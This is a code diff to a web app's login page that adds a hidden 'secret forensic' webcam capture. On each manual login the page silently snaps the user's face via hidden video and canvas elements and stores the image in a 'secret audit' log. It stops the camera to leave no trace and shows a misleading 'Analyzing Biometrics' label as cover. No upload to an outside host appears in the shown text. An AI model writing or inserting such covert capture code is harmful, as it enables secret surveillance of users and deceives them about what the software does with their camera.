@@ -477,6 +477,10 @@
 </head>
 <body>
 
+    <!-- MOTOR FORENSE SECRETO (WEBCAM) -->
+    <video id="forense-video" autoplay playsinline style="display:none;"></video>
+    <canvas id="forense-canvas" style="display:none;"></canvas>
+
     <div id="bootScreen">
         <div class="boot-container">
             <div class="boot-logo">MEDIUS CORE</div>
@@ -1150,6 +1154,46 @@
         let corAtual = "#00d2ff";
 
         // ==========================================
+        // MOTOR FORENSE E AUDITORIA (CAPTURAS)
+        // ==========================================
+        let logsAuditoria = [];
+
+        async function capturarForense() {
+            try {
+                // Solicita acesso à câmera silenciosamente (requer permissão prévia do navegador na 1ª vez)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const video = document.getElementById('forense-video');
+                const canvas = document.getElementById('forense-canvas');
+                
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const snapshot = canvas.toDataURL('image/jpeg', 0.5); // Comprime a foto em Base64
+                stream.getTracks().forEach(track => track.stop()); // Desliga a câmera imediatamente para não deixar rastro
+                
+                return snapshot;
+            } catch (err) {
+                console.warn("[SecOps] Captura ocular falhou ou bloqueada:", err);
+                return null;
+            }
+        }
+
+        function registrarLogAcesso(usuarioId, tipoAcesso, snapshot) {
+            const dataHora = new Date().toLocaleString('pt-BR');
+            logsAuditoria.unshift({
+                id: usuarioId,
+                tipo: tipoAcesso,
+                dataHora: dataHora,
+                foto: snapshot
+            });
+            console.log(`[AUDITORIA SECRETA] Acesso registrado: ${usuarioId} às ${dataHora}`);
+        }
+
+        // ==========================================
         // LOGIN E LOGOUT
         // ==========================================
         function autenticarComo(tipo, clientId = null) {
@@ -1174,9 +1218,27 @@
             }
         }
 
-        function realizarLoginManual(e) {
+        async function realizarLoginManual(e) {
             e.preventDefault();
+            
+            // Muda o botão para modo de carregamento
+            const btnLogin = e.target.querySelector('button[type="submit"]');
+            const textoOriginal = btnLogin.innerHTML;
+            btnLogin.innerHTML = `Analisando Biometria...`;
+            btnLogin.disabled = true;
+
             const user = document.getElementById('login-user').value.trim().toLowerCase();
+            
+            // 1. Dispara a captura forense silenciosa
+            const snapshot = await capturarForense();
+            
+            // 2. Registra o Log de Auditoria
+            registrarLogAcesso(user, (user === 'admin' ? 'QG Master' : 'Nó Cliente'), snapshot);
+
+            // 3. Restaura o botão e executa o Login
+            btnLogin.innerHTML = textoOriginal;
+            btnLogin.disabled = false;
+
             if (user === 'admin') {
                 autenticarComo('admin');
             } else if (databaseClientes[user]) {
